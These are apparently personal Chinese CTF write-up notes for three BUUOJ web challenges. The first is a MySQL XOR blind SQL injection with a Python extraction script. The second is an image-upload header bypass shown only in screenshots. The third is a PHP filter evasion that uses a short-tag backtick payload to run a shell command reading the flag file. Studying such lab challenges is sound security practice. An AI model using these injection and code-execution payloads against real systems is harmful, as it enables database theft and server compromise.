## 颜值成绩查询
#MYSQL-异或注入 #MYSQL-盲注 
payload
```
?stunum=1^(ascii(substr((select(database())),1,1))>1)^1
```

exp
```python
import requests

url = "http://6420a4a0-e3b3-47c0-9971-5ec1bd69cba2.node5.buuoj.cn:81/?stunum="

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 128

    while head < tail:
        mid = (head + tail) // 2
        payload1 = f'1^(ascii(substr((select(database())),{i},1))>{mid})^1'
        payload2 = f"1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{i},1))>{mid})^1"
        payload3 = f"1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{i},1))>{mid})^1"
        payload = f"1^(ascii(substr((select(group_concat(value))from(flag)),{i},1))>{mid})^1"
        r = requests.get(url + payload)
        # 回显信息
        if "Hi admin, your score is: 100" in r.text:
            head = mid + 1
        else:
            tail = mid
    result += chr(head)
    print(result)
    if head == 32:
        break
    
    
```

## CV Maker
#文件上传-exif_imgetype
文件头绕过
![](attachments/Pasted%20image%2020240321195513.png)

![](attachments/Pasted%20image%2020240321195445.png)


## write_shell
#PHP短标签
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

payload
```
?action=upload&data=<?echo%09`cat%09/flllllll1112222222lag`?>
```

对应pwd访问即可